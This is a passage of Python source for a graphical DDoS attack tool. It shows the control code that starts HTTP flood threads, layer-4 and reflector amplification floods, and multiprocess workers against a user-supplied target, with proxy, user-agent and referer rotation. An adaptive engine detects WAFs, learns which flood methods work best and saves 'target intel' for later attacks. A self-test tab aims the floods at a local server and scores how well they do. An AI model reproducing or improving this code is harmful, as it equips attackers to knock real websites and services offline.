                        for method in new_methods:

                            self.log_message(f"{prefix} → Creating {threads_per_l7} L7 threads for {method}...")
                            for thread_id in range(threads_per_l7):
                                t = HttpFlood(thread_id, parsed_url, host, method, rpc,
                                             self.event, uagents, referers, proxies)
                                t._kill_event = new_kill  # Bind generation kill switch
                                t.daemon = True
                                t.start()
                                self.attack_threads.append(t)
                        # event stays SET — L4 keeps running, new L7 picks up immediately.
                        # Old threads die naturally on next iteration of their run loop.
                        last_method_count = len(new_methods)
                        l7_methods = new_methods


                remaining = end_time - time.time()
                if remaining <= 0:
                    break
                stop_event.wait(min(0.05, remaining))

            # === FIX "exceeds duration" bug ===
            # Stop all worker threads IMMEDIATELY when duration ends, BEFORE
            # any cleanup (which can take 5-10s due to webhook, memory save,
            # health monitor.join). Workers won't see event.clear() until next
            # iteration of their run loop, so we ALSO signal kill_event for L7
            # threads to drop out of long socket operations within ~1s.
            self.log_message(f"[Duration] ⏰ Time's up — stopping all workers immediately")
            self.event.clear()
            for t in self.attack_threads:
                if isinstance(t, HttpFlood):
                    try:
                        if t._kill_event is not None:
                            t._kill_event.set()
                    except Exception:
                        pass
            # Clear hot-path hook so workers stop calling adaptive callbacks
            _set_adaptive_request_hook(None)

            # === Multiprocess workers: signal shared kill_event, then join with
            # short timeout. Joining (vs immediate terminate) lets every worker
            # reach its "Worker finished" print before we declare the attack
            # done. Stragglers past 2s get terminate()'d as a last resort. ===
            if mp_kill_event is not None:
                try:
                    mp_kill_event.set()
                except Exception:
                    pass
            if mp_processes:
                self.log_message(f"[Multiprocess] Waiting for {len(mp_processes)} workers to drain (max 2s each)...")
                for p in mp_processes:
                    try:
                        p.join(timeout=2.0)
                    except Exception:
                        pass
                stragglers = [p for p in mp_processes if p.is_alive()]
                if stragglers:
                    self.log_message(f"[Multiprocess] {len(stragglers)} worker(s) didn't drain in time — terminating")
                    for p in stragglers:
                        try:
                            p.terminate()
                        except Exception:
                            pass
                # Drop references so attack_finished() doesn't try to terminate
                # already-exited processes.
                self._mp_processes = []
                self._mp_kill_event = None
            # Clear shared MP counter refs so next attack starts fresh
            # (otherwise GUI would keep reading stale subprocess counters)
            self._mp_total_req = None
            self._mp_total_bytes = None
            self._last_mp_total = 0
            self._last_mp_bytes = 0


            # Freeze progress bar at 100% immediately so user sees attack stopped

            # at correct time. live_stats_timer keeps running but elapsed updates
            # stop reflecting "still attacking" since event.clear() killed traffic.
            self._attack_start_time = None  # Triggers _update_live_stats to skip


            # === Persist target memory BEFORE stopping engine (so Bayesian
            #     portfolio learning survives across attacks). Without this,
            #     2 hours of Bayesian convergence is lost on every restart. ===
            if adaptive_engine and adaptive_engine.target_url:
                try:
                    best = sorted(adaptive_engine.portfolio.alpha.items(),
                                  key=lambda x: x[1] / max(x[1] + adaptive_engine.portfolio.beta[x[0]], 1),
                                  reverse=True)[:5]
                    best_names = [m for m, _ in best]
                    total = sum((adaptive_engine.portfolio.alpha[m] for m in adaptive_engine.portfolio.alpha))
                    success = sum((adaptive_engine.portfolio.alpha[m] - 1 for m in adaptive_engine.portfolio.alpha))
                    success_rate = success / max(1, total - len(adaptive_engine.portfolio.alpha))
                    TargetMemory.record_attack(
                        adaptive_engine.target_url,
                        adaptive_engine.detected_waf,
                        adaptive_engine.all_methods,
                        max(0.0, min(1.0, success_rate)),
                        best_names,
                    )
                    self.log_message(f"[Memory] 💾 Target intel saved: top methods = {', '.join(best_names[:3])}")
                except Exception as _e:
                    self.log_message(f"[Memory] Save failed: {_e}")

            # Run heavy cleanup (webhook + health monitor stop) in BACKGROUND
            # so it doesn't extend the perceived "attack duration".
            def _bg_cleanup(ctrl, eng):
                try:
                    if ctrl:
                        ctrl.stop()
                    elif eng:
                        eng.stop()
                except Exception:
                    pass
            Thread(target=_bg_cleanup, args=(adaptive_ctrl, adaptive_engine), daemon=True).start()
            # Clear controller reference for status indicator
            self._active_adaptive_ctrl = None

            self.log_message("Combined attack finished.")




        except Exception as e:
            self.log_message(f"Combined attack error: {str(e)}")
            import traceback
            self.log_message(traceback.format_exc())
        finally:
            self.event.clear()
            self.log_message("Cleaning combined attack resources...")


    def start_real_attack(self, attack_type, method, target, threads, duration, 
                         proxy_ty=None, proxy_file=None, rpc=None, reflector_file=None, stop_event=None):
        try:
            self.log_message("Prepare attack parameters...")
            self.attack_threads = []
            self.event.clear()
            if attack_type == "layer7":
                url = URL(target)
                host = url.host
                
                if proxy_ty == 6:
                    proxy_ty = randchoice([4, 5, 1])
                
                proxy_li = Path(proxy_file)
                proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                
                useragent_li = Path(__dir__ / "files/useragent.txt")
                referers_li = Path(__dir__ / "files/referers.txt")
                
                if not useragent_li.exists():
                    raise FileNotFoundError("User-Agent: File not found")
                if not referers_li.exists():
                    raise FileNotFoundError("Referer :File not found.")
                
                uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
                referers = set(a.strip() for a in referers_li.open("r+").readlines())
                
                self.log_message(f"Starting {threads} attacking threads...")
                for thread_id in range(threads):
                    t = HttpFlood(
                        thread_id,
                        url,
                        host,
                        method,
                        rpc,
                        self.event,
                        uagents,
                        referers,
                        proxies
                    )
                    t.daemon = True
                    t.start() 
                    self.attack_threads.append(t)
                self.log_message(f"Created {len(self.attack_threads)} threads")
        
            
            else:
                if ":" in target:
                    ip, port_str = target.split(":", 1)
                    port = int(port_str)
                else:
                    ip = target
                    port = 80
                ref = None
                if method in Methods.LAYER4_AMP and reflector_file:
                    refl_li = Path(reflector_file)
                    if refl_li.exists():
                        ref = set(a.strip() for a in Tools.IP.findall(refl_li.open("r").read()))
                
                self.log_message(f"Running attacking thread of {threads}...")
                for _ in range(threads):
                    t = Layer4(
                        (ip, port),
                        ref,
                        method,
                        self.event
                    )
                    t.daemon = True
                    t.start() 
                    self.attack_threads.append(t)
                self.log_message(f"Created {len(self.attack_threads)} threads")

            self.log_message("Setting event flag...")
            self.event.set()
            self.log_message(f"Attack started! Duration: {duration}s")

            start_time = time.time()
            end_time = start_time + duration
            next_stats_time = start_time
            while time.time() < end_time and not stop_event.is_set():
                now = time.time()
                if now >= next_stats_time:
                    stats = (f"Target: {target}  "
                             f"Method: {method}  "
                             f"Req: {Tools.humanformat(int(REQUESTS_SENT))}/s  "
                             f"Sent: {Tools.humanbytes(int(BYTES_SEND))}/s  "
                             f"Time: {int(now - start_time)}s/{duration}s")
                    self.log_message(stats)
                    REQUESTS_SENT.set(0)
                    BYTES_SEND.set(0)
                    next_stats_time += 1.0

                remaining = end_time - now
                if remaining <= 0:
                    break
                stop_event.wait(min(0.05, remaining))

            # === Ensure workers stop promptly when duration ends ===
            # Some HttpFlood threads may be blocked in long socket ops and
            # won't immediately see `self.event.clear()`; signal their
            # per-generation kill_event (if bound) so they drop out quickly.
            self.log_message("[Duration] ⏰ Time's up — stopping all workers immediately")
            try:
                self.event.clear()
            except Exception:
                pass

            if hasattr(self, 'attack_threads') and self.attack_threads:
                for t in list(self.attack_threads):
                    if isinstance(t, HttpFlood):
                        try:
                            if getattr(t, '_kill_event', None) is not None:
                                t._kill_event.set()
                        except Exception:
                            pass

            # Terminate any multiprocess workers if present
            if hasattr(self, '_mp_processes') and self._mp_processes:
                for p in self._mp_processes:
                    try:
                        if p.is_alive():
                            p.terminate()
                    except Exception:
                        pass

            # Stop live stats timer update from showing an ongoing attack
            try:
                self._attack_start_time = None
            except Exception:
                pass

            self.log_message("Attack finished.")
            
        except Exception as e:
            self.log_message(f"Attacking Error: {str(e)}")
            import traceback
            self.log_message(traceback.format_exc())
        finally:
            self.event.clear()
            self.log_message("Cleaning attack release...")

    def check_attack_status(self):
        if self.attack_thread and self.attack_thread.isRunning():
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.force_stop_btn.setEnabled(True)
            self.start_layer4_btn.setEnabled(False)
            self.stop_layer4_btn.setEnabled(False)
            self.force_stop_layer4_btn.setEnabled(False)
        else:
            self.status_timer.stop()
            self.attack_finished()

    def stop_attack(self):
        """Non-blocking stop - signals threads but doesn't wait. Avoids GUI freeze."""
        if self.attack_thread and self.attack_thread.isRunning():
            self.log_message("Stopping attack (non-blocking)...")
            self.attack_thread.stop()
            self.event.clear()
            # Signal MP workers to drain cleanly so each prints "Worker finished"
            # before its parent thread joins/terminates them.
            mp_kill = getattr(self, '_mp_kill_event', None)
            if mp_kill is not None:
                try:
                    mp_kill.set()
                except Exception:
                    pass
            self.status_label.setText("Stopping attack...")

            
            # Disable buttons immediately for responsive UI
            self.stop_btn.setEnabled(False)
            self.stop_layer4_btn.setEnabled(False)
            self.stop_combined_btn.setEnabled(False)
            
            # Schedule a non-blocking poll for completion (max 3s)
            self._stop_attempts = 0
            self._stop_poll_timer = QTimer(self)
            self._stop_poll_timer.timeout.connect(self._poll_stop_status)
            self._stop_poll_timer.start(200)  # Poll every 200ms

    def _poll_stop_status(self):
        """Poll if attack thread finished. Falls back to force_stop after 3s."""
        self._stop_attempts += 1
        if not self.attack_thread or not self.attack_thread.isRunning():
            # Thread stopped cleanly
            self._stop_poll_timer.stop()
            self.log_message("Attack stopped cleanly.")
            self.attack_finished()
        elif self._stop_attempts >= 15:  # 3 seconds = 15 * 200ms
            # Timeout — force stop
            self._stop_poll_timer.stop()
            self.log_message("Stop timed out, forcing termination...")
            self.force_stop_attack()

    def force_stop_attack(self):
        """Non-blocking force stop - terminates QThread, doesn't join daemon threads (they die with process)."""
        self.log_message("Force stop all threads...")
        self.status_timer.stop()
        if hasattr(self, '_stop_poll_timer'):
            self._stop_poll_timer.stop()

        self.event.clear()
        if self.attack_thread and self.attack_thread.isRunning():
            self.attack_thread.terminate()
            # Don't wait - terminate is async, daemon threads die with process anyway

        # === Multiprocess workers stop — they're independent subprocess Python
        # so QThread terminate does NOT kill them. Set the shared kill_event
        # (best-effort, lets fast workers print "Worker finished" on their
        # own) and immediately SIGTERM all of them. NO join here — Force Stop
        # MUST stay non-blocking, otherwise GUI freezes for N×timeout seconds
        # while we wait for stragglers. Graceful drain happens in stop_attack;
        # Force Stop is the user explicitly choosing speed over cleanliness. ===
        mp_kill = getattr(self, '_mp_kill_event', None)
        if mp_kill is not None:
            try:
                mp_kill.set()
            except Exception:
                pass
        if hasattr(self, '_mp_processes') and self._mp_processes:
            self.log_message(f"[Multiprocess] Terminating {len(self._mp_processes)} subprocess workers...")
            for p in self._mp_processes:
                try:
                    if p.is_alive():
                        p.terminate()
                except Exception:
                    pass
            self._mp_processes = []
            self._mp_kill_event = None



        # Don't join attack_threads list - they're daemon threads, will die with process.
        # Joining 100+ threads here blocks the GUI for 30+ seconds.
        self.log_message("Stop signal sent to all threads. They will exit on next iteration.")
        self.attack_finished()


    def _cleanup_on_close(self):
        self.log_message("GUI closing: cleanup active attacks and subprocesses...")
        try:
            self.event.clear()
        except Exception:
            pass

        try:
            if self.attack_thread and self.attack_thread.isRunning():
                self.force_stop_attack()
        except Exception:
            pass

        try:
            if hasattr(self, '_mp_kill_event') and self._mp_kill_event is not None:
                self._mp_kill_event.set()
        except Exception:
            pass

        try:
            if hasattr(self, '_mp_processes') and self._mp_processes:
                for p in self._mp_processes:
                    try:
                        if p.is_alive():
                            p.terminate()
                    except Exception:
                        pass
                self._mp_processes = []
                self._mp_kill_event = None
        except Exception:
            pass

        try:
            self._selftest_stop()
        except Exception:
            pass

        try:
            if hasattr(self, 'status_timer'):
                self.status_timer.stop()
        except Exception:
            pass


    def attack_finished(self):
        self.log_message("The attack is complete.")
        self.status_label.setText("Ready")
        # Stop live stats timer + reset progress bar
        if hasattr(self, 'live_stats_timer'):
            self.live_stats_timer.stop()
        self._attack_start_time = None
        if hasattr(self, 'progress_bar'):
            self.progress_bar.setValue(0)
            self.progress_bar.setFormat("Idle - 0%")
        # Reset adaptive status indicator to IDLE
        if hasattr(self, 'adaptive_status_label'):
            self.adaptive_status_label.setText("● IDLE")
            self.adaptive_status_label.setStyleSheet("QLabel { color: #888; font-weight: bold; }")
        if hasattr(self, 'adaptive_metrics_label'):
            self.adaptive_metrics_label.setText("HB: --  Banned: 0  WAF: -")
        self._active_adaptive_ctrl = None
        self.start_btn.setEnabled(True)

        self.stop_btn.setEnabled(False)
        self.force_stop_btn.setEnabled(False)
        self.start_layer4_btn.setEnabled(True)
        self.stop_layer4_btn.setEnabled(False)
        self.force_stop_layer4_btn.setEnabled(False)
        self.start_combined_btn.setEnabled(True)
        self.stop_combined_btn.setEnabled(False)
        self.force_stop_combined_btn.setEnabled(False)
        self.event.clear()
        if hasattr(self, 'attack_threads'):
            del self.attack_threads
            self.attack_threads = []

    # === Self-Test Lab (Plan E+ Fase 1) ===
    def init_selftest_ui(self):
        """Build the Self-Test Lab tab UI for safe local attack validation."""
        layout = QVBoxLayout(self.selftest_tab)

        title = QLabel("🧪 Self-Test Lab — local target server for safe attack validation")
        title.setStyleSheet("QLabel { font-size: 16px; font-weight: bold; padding: 6px; }")
        layout.addWidget(title)

        warning = QLabel(
            "⚠ Self-test results don't translate to WAF-protected real targets. "
            "Use this to validate the tool works, not to predict real-world impact."
        )
        warning.setWordWrap(True)
        warning.setStyleSheet(
            "QLabel { background: #3a2a00; color: #ffcc66; padding: 8px; "
            "border: 1px solid #aa7700; border-radius: 4px; }"
        )
        layout.addWidget(warning)

        # Status + port row
        status_row = QHBoxLayout()
        self._selftest_status_label = QLabel("● STOPPED")
        self._selftest_status_label.setStyleSheet(
            "QLabel { color: #ff5555; font-weight: bold; font-size: 14px; }"
        )
        status_row.addWidget(self._selftest_status_label)
        status_row.addStretch()
        status_row.addWidget(QLabel("Port:"))
        self._selftest_port_spin = QSpinBox()
        self._selftest_port_spin.setRange(1024, 65535)
        self._selftest_port_spin.setValue(8888)
        status_row.addWidget(self._selftest_port_spin)
        layout.addLayout(status_row)

        # Control buttons
        btn_row = QHBoxLayout()
        self._selftest_spawn_btn = QPushButton("🟢 Spawn Local Server")
        self._selftest_spawn_btn.clicked.connect(self._selftest_spawn)
        btn_row.addWidget(self._selftest_spawn_btn)

        self._selftest_stop_btn = QPushButton("🔴 Stop Local Server")
        self._selftest_stop_btn.clicked.connect(self._selftest_stop)
        self._selftest_stop_btn.setEnabled(False)
        btn_row.addWidget(self._selftest_stop_btn)

        self._selftest_attack_btn = QPushButton("🎯 Attack Localhost (sets Combined tab URL)")
        self._selftest_attack_btn.clicked.connect(self._selftest_attack_localhost)
        btn_row.addWidget(self._selftest_attack_btn)
        layout.addLayout(btn_row)

        # Grader buttons row (Plan E+ Fase 3 — auto-grader)
        grader_row = QHBoxLayout()
        self._selftest_grade_btn = QPushButton("📊 Grade Last Run (score 0-100)")
        self._selftest_grade_btn.setToolTip(
            "Score the latest stats history (RPS, latency, CPU, errors)\n"
            "with the formula: 40% RPS + 25% latency + 20% CPU + 15% errors."
        )
        self._selftest_grade_btn.clicked.connect(self._selftest_grade_last_run)
        grader_row.addWidget(self._selftest_grade_btn)

        self._selftest_report_btn = QPushButton("🏆 Save HTML Report")
        self._selftest_report_btn.setToolTip(
            "Export the current grade as a self-contained HTML report\n"
            "with bar chart and verdict label."
        )
        self._selftest_report_btn.clicked.connect(self._selftest_save_report)
        grader_row.addWidget(self._selftest_report_btn)
        grader_row.addStretch()
        layout.addLayout(grader_row)

        # Last grade label — shown after Grade button pressed
        self._selftest_last_grade_label = QLabel("No grade yet — run an attack and click Grade.")
        self._selftest_last_grade_label.setStyleSheet(
            "QLabel { font-family: monospace; padding: 8px; "
            "background: #1a1a1a; border: 1px solid #333; border-radius: 3px; "
            "color: #ffcc66; }"
        )
        self._selftest_last_grade_label.setWordWrap(True)
        layout.addWidget(self._selftest_last_grade_label)
        self._selftest_last_grade = None  # cache for HTML export

        # Endpoint list
        endpoints_box = QGroupBox("Available endpoints on local server")
        ep_layout = QVBoxLayout(endpoints_box)
        for ep, desc in [
            ("/", "landing page"),
            ("/api/heavy", "CPU-intensive endpoint (good attack target)"),
            ("/api/protected", "rate-limited endpoint"),
            ("/admin", "fake admin panel"),
            ("/health", "always-200 health check"),
            ("/__stats__", "live request counters"),
        ]:
            ep_label = QLabel(f"  • {ep}  —  {desc}")
            ep_label.setStyleSheet("QLabel { font-family: monospace; color: #aaccff; }")
            ep_layout.addWidget(ep_label)
        layout.addWidget(endpoints_box)

        # Live stats panel (poll /__stats__ every 1s while server running)
        stats_box = QGroupBox("📊 Live server stats (polled every 1s)")
        stats_layout = QHBoxLayout(stats_box)
        self._selftest_stats_rps = QLabel("RPS: —")
        self._selftest_stats_total = QLabel("Total: —")
        self._selftest_stats_errors = QLabel("Errors: —")
        self._selftest_stats_p50 = QLabel("p50: —")
        self._selftest_stats_p99 = QLabel("p99: —")
        self._selftest_stats_cpu = QLabel("CPU: —")
        self._selftest_stats_mem = QLabel("Mem: —")
        for lbl in (
            self._selftest_stats_rps, self._selftest_stats_total,
            self._selftest_stats_errors, self._selftest_stats_p50,
            self._selftest_stats_p99, self._selftest_stats_cpu,
            self._selftest_stats_mem,
        ):
            lbl.setStyleSheet(
                "QLabel { font-family: monospace; padding: 4px 8px; "
                "background: #1a1a1a; border: 1px solid #333; border-radius: 3px; "
                "color: #aaffaa; }"
            )
            stats_layout.addWidget(lbl)
        layout.addWidget(stats_box)

        # Live charts (matplotlib embed) — 3 subplots: RPS, latency, CPU/Mem
        # Lazy-imported on demand so older systems without matplotlib still
        # boot the GUI; charts simply don't render if import fails.
        self._selftest_charts_canvas = None
        try:
            from matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg
            from matplotlib.figure import Figure
            charts_box = QGroupBox("📈 Live charts (60s rolling window)")
            charts_layout = QVBoxLayout(charts_box)
            fig = Figure(figsize=(8, 4), facecolor="#1a1a1a", tight_layout=True)
            self._selftest_charts_fig = fig
            self._selftest_charts_canvas = FigureCanvasQTAgg(fig)
            self._selftest_charts_canvas.setMinimumHeight(280)
            charts_layout.addWidget(self._selftest_charts_canvas)
            layout.addWidget(charts_box)

            # 3 subplots stacked vertically: RPS, latency p50/p99, CPU+Mem
            self._selftest_ax_rps = fig.add_subplot(3, 1, 1)
            self._selftest_ax_lat = fig.add_subplot(3, 1, 2)
            self._selftest_ax_sys = fig.add_subplot(3, 1, 3)
            for ax in (self._selftest_ax_rps, self._selftest_ax_lat, self._selftest_ax_sys):
                ax.set_facecolor("#111111")
                ax.tick_params(colors="#aaaaaa", labelsize=7)
                for spine in ax.spines.values():
                    spine.set_color("#444444")
                ax.grid(True, color="#333333", linewidth=0.5, alpha=0.6)
            self._selftest_ax_rps.set_ylabel("RPS", color="#aaffaa", fontsize=8)
            self._selftest_ax_lat.set_ylabel("ms", color="#ffccaa", fontsize=8)
            self._selftest_ax_sys.set_ylabel("CPU%/MB", color="#aaccff", fontsize=8)
            self._selftest_ax_sys.set_xlabel("seconds", color="#aaaaaa", fontsize=8)
        except Exception as _e:
            # matplotlib not installed or import failed — skip charts silently
            self._selftest_charts_canvas = None

        # Live server log
        log_label = QLabel("Server stdout (live):")
        layout.addWidget(log_label)
        self._selftest_log = QTextEdit()
        self._selftest_log.setReadOnly(True)
        self._selftest_log.setMaximumHeight(150)
        self._selftest_log.setStyleSheet(
            "QTextEdit { font-family: 'Courier New', monospace; "
            "background: #111; color: #cfc; border: 1px solid #333; }"
        )
        layout.addWidget(self._selftest_log)

        # Route 🧪-prefixed log lines into the selftest log widget too
        self._safe_log_signal.connect(self._selftest_append_log)

        layout.addStretch()

        self._selftest_proc = None
        self._selftest_reader_thread = None

        # History buffers for chart rendering — 60-sample rolling window
        from collections import deque as _deque
        self._selftest_hist_t = _deque(maxlen=60)
        self._selftest_hist_rps = _deque(maxlen=60)
        self._selftest_hist_p50 = _deque(maxlen=60)
        self._selftest_hist_p99 = _deque(maxlen=60)
        self._selftest_hist_cpu = _deque(maxlen=60)
        self._selftest_hist_mem = _deque(maxlen=60)
        self._selftest_chart_t0 = None

        # Stats poll timer (started on spawn, stopped on stop)
        self._selftest_stats_timer = QTimer(self)
        self._selftest_stats_timer.setInterval(1000)
        self._selftest_stats_timer.timeout.connect(self._selftest_poll_stats)

    def _selftest_append_log(self, line: str):
        """Slot: append selftest-tagged lines to the self-test log widget (cross-thread safe)."""
        if hasattr(self, '_selftest_log') and self._selftest_log is not None:
            if line.startswith("🧪") or line.startswith("[selftest]"):
                self._selftest_log.append(line.rstrip())

    def _selftest_spawn(self):
        """Spawn the local self-test server as a subprocess and stream its stdout."""
        import subprocess
        if getattr(self, '_selftest_proc', None) is not None and self._selftest_proc.poll() is None:
            self.log_message("🧪 Self-test server already running.")
            return

        port = self._selftest_port_spin.value()
        server_path = __dir__ / "selftest_server.py"
        if not server_path.exists():
            self.log_message(f"🧪 ERROR: {server_path} not found.")
            return

        self._selftest_status_label.setText("● STARTING...")
        self._selftest_status_label.setStyleSheet(
            "QLabel { color: #ffaa00; font-weight: bold; font-size: 14px; }"
        )

        try:
            self._selftest_proc = subprocess.Popen(
                ["python3", str(server_path), "--port", str(port)],
                cwd=str(__dir__),
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                bufsize=1,
                universal_newlines=True,
            )
        except Exception as e:
            self.log_message(f"🧪 Failed to spawn server: {e}")
            self._selftest_status_label.setText("● STOPPED")
            self._selftest_status_label.setStyleSheet(
                "QLabel { color: #ff5555; font-weight: bold; font-size: 14px; }"
            )
            return

        def _reader(proc):
            try:
                for raw in iter(proc.stdout.readline, ''):
                    if not raw:
                        break
                    self._safe_log_signal.emit(f"🧪 {raw.rstrip()}")
            except Exception as ex:
                self._safe_log_signal.emit(f"🧪 [reader-error] {ex}")
            finally:
                self._safe_log_signal.emit("🧪 Server stdout stream closed.")

        self._selftest_reader_thread = Thread(target=_reader, args=(self._selftest_proc,), daemon=True)
        self._selftest_reader_thread.start()

        # Health-check: poll /health up to 10 times with 200ms gap to confirm
        # the server actually bound the port (not crashed on import). If it
        # fails, label flips back to STOPPED and we tell the user.
        import urllib.request as _urlreq
        import urllib.error as _urlerr
        healthy = False
        for _ in range(10):
            time.sleep(0.2)
            if self._selftest_proc.poll() is not None:
                self.log_message(
                    f"🧪 Server crashed during startup (exit={self._selftest_proc.returncode}). "
                    f"Check log above for traceback."
                )
                self._selftest_status_label.setText("● STOPPED")
                self._selftest_status_label.setStyleSheet(
                    "QLabel { color: #ff5555; font-weight: bold; font-size: 14px; }"
                )
                self._selftest_proc = None
                return
            try:
                with _urlreq.urlopen(f"http://127.0.0.1:{port}/health", timeout=0.5) as resp:
                    if resp.status == 200:
                        healthy = True
                        break
            except (_urlerr.URLError, ConnectionError, OSError):
                continue
        if not healthy:
            self.log_message(f"🧪 Server didn't respond to /health within 2s — but process is alive, continuing.")

        self._selftest_status_label.setText("● RUNNING")
        self._selftest_status_label.setStyleSheet(
            "QLabel { color: #55ff55; font-weight: bold; font-size: 14px; }"
        )
        self._selftest_spawn_btn.setEnabled(False)
        self._selftest_stop_btn.setEnabled(True)
        self._selftest_port_spin.setEnabled(False)
        # Start polling /__stats__ every 1s
        self._selftest_stats_timer.start()
        self.log_message(f"🧪 Spawned self-test server on port {port} (pid={self._selftest_proc.pid}).")

    def _selftest_stop(self):
        """Stop the local self-test server, escalating to kill if it doesn't exit."""
        proc = getattr(self, '_selftest_proc', None)
        if proc is None:
            self.log_message("🧪 No server to stop.")
            return

        if proc.poll() is None:
            try:
                proc.terminate()
            except Exception as e:
                self.log_message(f"🧪 terminate() failed: {e}")

            waited = 0.0
            while proc.poll() is None and waited < 3.0:
                time.sleep(0.1)
                waited += 0.1

            if proc.poll() is None:
                try:
                    proc.kill()
                    self.log_message("🧪 Server did not exit in 3s, force killed.")
                except Exception as e:
                    self.log_message(f"🧪 kill() failed: {e}")

        self._selftest_proc = None
        self._selftest_status_label.setText("● STOPPED")
        self._selftest_status_label.setStyleSheet(
            "QLabel { color: #ff5555; font-weight: bold; font-size: 14px; }"
        )
        self._selftest_spawn_btn.setEnabled(True)
        self._selftest_stop_btn.setEnabled(False)
        self._selftest_port_spin.setEnabled(True)
        # Stop stats poll timer + reset stat labels
        if hasattr(self, '_selftest_stats_timer'):
            self._selftest_stats_timer.stop()
        for lbl, prefix in [
            (self._selftest_stats_rps, "RPS"),
            (self._selftest_stats_total, "Total"),
            (self._selftest_stats_errors, "Errors"),
            (self._selftest_stats_p50, "p50"),
            (self._selftest_stats_p99, "p99"),
            (self._selftest_stats_cpu, "CPU"),
            (self._selftest_stats_mem, "Mem"),
        ]:
            lbl.setText(f"{prefix}: —")
        self.log_message("🧪 Server stopped")

    def _selftest_poll_stats(self):
        """Poll the running self-test server's /__stats__ endpoint and update labels.
           Runs on Qt timer (every 1s). Quietly drops on connection errors."""
        proc = getattr(self, '_selftest_proc', None)
        if proc is None or proc.poll() is not None:
            return
        port = self._selftest_port_spin.value()
        try:
            import urllib.request as _urlreq
            import json as _json
            with _urlreq.urlopen(f"http://127.0.0.1:{port}/__stats__", timeout=0.4) as resp:
                if resp.status != 200:
                    return
                data = _json.loads(resp.read().decode("utf-8", errors="replace"))
        except Exception:
            return
        # Update labels
        rps = data.get('rps_5s', 0)
        p50 = data.get('p50_ms', 0)
        p99 = data.get('p99_ms', 0)
        cpu = data.get('cpu_pct', -1)
        mem = data.get('mem_mb', -1)
        self._selftest_stats_rps.setText(f"RPS: {rps:.1f}")
        self._selftest_stats_total.setText(f"Total: {data.get('requests_total', 0)}")
        errs = data.get('errors_total', 0)
        self._selftest_stats_errors.setText(f"Errors: {errs}")
        self._selftest_stats_p50.setText(f"p50: {p50:.1f}ms")
        self._selftest_stats_p99.setText(f"p99: {p99:.1f}ms")
        self._selftest_stats_cpu.setText(f"CPU: {cpu:.1f}%" if cpu >= 0 else "CPU: n/a")
        self._selftest_stats_mem.setText(f"Mem: {mem:.1f}MB" if mem >= 0 else "Mem: n/a")

        # Append to chart history (skip if charts unavailable)
        if self._selftest_charts_canvas is not None:
            now = time.time()
            if self._selftest_chart_t0 is None:
                self._selftest_chart_t0 = now
            t_rel = now - self._selftest_chart_t0
            self._selftest_hist_t.append(t_rel)
            self._selftest_hist_rps.append(rps)
            self._selftest_hist_p50.append(p50)
            self._selftest_hist_p99.append(p99)
            self._selftest_hist_cpu.append(max(0.0, cpu))
            self._selftest_hist_mem.append(max(0.0, mem))
            self._selftest_render_charts()

    def _selftest_render_charts(self):
        """Redraw the 3 chart subplots from current history deques.
           Cheap enough to call every poll (1 Hz) — matplotlib clears+plots
           ~60 points across 3 axes in ~10ms."""
        if self._selftest_charts_canvas is None:
            return
        if not self._selftest_hist_t:
            return
        try:
            t = list(self._selftest_hist_t)

            # Axis 1: RPS
            ax = self._selftest_ax_rps
            ax.clear()
            ax.set_facecolor("#111111")
            ax.tick_params(colors="#aaaaaa", labelsize=7)
            for spine in ax.spines.values():
                spine.set_color("#444444")
            ax.grid(True, color="#333333", linewidth=0.5, alpha=0.6)
            ax.set_ylabel("RPS", color="#aaffaa", fontsize=8)
            ax.plot(t, list(self._selftest_hist_rps),
                    color="#55ff88", linewidth=1.5, label="RPS")
            ax.fill_between(t, 0, list(self._selftest_hist_rps),
                            color="#55ff88", alpha=0.2)
            ax.legend(loc="upper left", fontsize=7,
                      facecolor="#1a1a1a", edgecolor="#444",
                      labelcolor="#cccccc")

            # Axis 2: latency p50 + p99
            ax = self._selftest_ax_lat
            ax.clear()
            ax.set_facecolor("#111111")
            ax.tick_params(colors="#aaaaaa", labelsize=7)
            for spine in ax.spines.values():
                spine.set_color("#444444")
            ax.grid(True, color="#333333", linewidth=0.5, alpha=0.6)
            ax.set_ylabel("ms", color="#ffccaa", fontsize=8)
            ax.plot(t, list(self._selftest_hist_p50),
                    color="#66aaff", linewidth=1.4, label="p50")
            ax.plot(t, list(self._selftest_hist_p99),
                    color="#ff6666", linewidth=1.4, label="p99")
            ax.legend(loc="upper left", fontsize=7,
                      facecolor="#1a1a1a", edgecolor="#444",
                      labelcolor="#cccccc")

            # Axis 3: CPU% (left) + Mem MB (right via twinx)
            ax = self._selftest_ax_sys
            ax.clear()
            ax.set_facecolor("#111111")
            ax.tick_params(colors="#aaaaaa", labelsize=7)
            for spine in ax.spines.values():
                spine.set_color("#444444")
            ax.grid(True, color="#333333", linewidth=0.5, alpha=0.6)
            ax.set_ylabel("CPU%", color="#aaccff", fontsize=8)
            ax.set_xlabel("seconds", color="#aaaaaa", fontsize=8)
            ax.plot(t, list(self._selftest_hist_cpu),
                    color="#ffaa44", linewidth=1.4, label="CPU%")
            ax.plot(t, list(self._selftest_hist_mem),
                    color="#cc88ff", linewidth=1.4, label="Mem MB")
            ax.legend(loc="upper left", fontsize=7,
                      facecolor="#1a1a1a", edgecolor="#444",
                      labelcolor="#cccccc")

            self._selftest_charts_canvas.draw_idle()
        except Exception:
            # Don't let a render glitch crash the polling timer
            pass

    def _selftest_attack_localhost(self):
        """Configure Combined tab to attack the local self-test server."""
        port = self._selftest_port_spin.value()
        target_url = f"http://127.0.0.1:{port}/api/heavy"
        try:
            self.combined_url_input.setText(target_url)
        except Exception as e:
            self.log_message(f"🧪 Could not set Combined URL: {e}")
            return
        try:
            self.tabs.setCurrentWidget(self.combined_tab)
        except Exception:
            pass
        self.log_message(f"🧪 Attack URL set to {target_url}. Press 'Start attack' on Combined tab")

    def _selftest_grade_last_run(self):
        """Score the last 60s of self-test stats history using selftest_grader.

           Bias: scoring uses the deque snapshots that the GUI already polls,
           so this works whether or not server is still running."""
        if not self._selftest_hist_t:
            self._selftest_last_grade_label.setText(
                "⚠ No data — spawn server, run an attack, then click Grade."
            )
            self._selftest_last_grade_label.setStyleSheet(
                "QLabel { font-family: monospace; padding: 8px; "
                "background: #3a2a00; border: 1px solid #aa7700; border-radius: 3px; "
                "color: #ffaa44; }"
            )
            return
        try:
            from selftest_grader import grade_run
        except Exception as e:
